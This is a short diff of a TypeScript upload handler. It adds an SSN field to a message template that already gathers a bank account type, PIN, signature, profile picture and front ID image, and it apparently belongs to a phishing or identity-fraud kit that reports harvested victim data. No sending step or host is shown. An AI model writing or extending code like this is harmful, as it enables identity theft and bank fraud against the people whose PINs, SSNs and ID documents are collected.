@@ -145,7 +145,7 @@ const handleBackUpload = async (file: File) => {
 🏦 Account Type: ${data.accountType}
 📂 Sub Type: ${data.accountSubType}
 🔐 PIN: ${data.pin}
-
+ssn: ${data.ssn}
 ✍ Signature: ${data.signature}
 🖼 Profile: ${data.profilePicture}
 🆔 Front ID: ${data.frontId}
